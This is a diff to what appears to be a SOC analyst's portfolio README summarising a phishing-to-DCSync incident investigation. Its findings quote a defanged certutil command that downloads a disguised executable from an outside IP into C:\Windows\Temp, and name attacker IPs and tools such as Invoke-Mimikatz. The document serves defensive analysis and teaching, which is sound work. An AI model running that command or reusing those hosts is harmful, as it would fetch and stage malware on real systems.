@@ -47,8 +47,7 @@ This portfolio demonstrates real SOC workflows including alert triage, threat hu
 - Analyzing Sysmon to reconstruct macro execution and child process activity
 - Discovered certutil-based C2 executable download and data staging path C:\Windows\Temp\
 - Traced PowerView.ps1 / Invoke-Mimikatz.ps1 download and execution via PowerShell bypass
-- Identified scheduled task persistence and pivoted to Domain Controller via DCSync analysis
-- 
+- Identified scheduled task persistence and pivoted to Domain Controller via DCSync analysis  
 **Findings:**  
 - Phishing payload: Invoice.docm  via 139.59.21.147:8080
 - The embedded commandline "cmd.exe /c certutil -urlcache -split -f "http[:]//24[.]199[.]117[.]142[:]1337/svchost.exe" "C:\Windows\Temp\svchost.exe" " was interpretered.
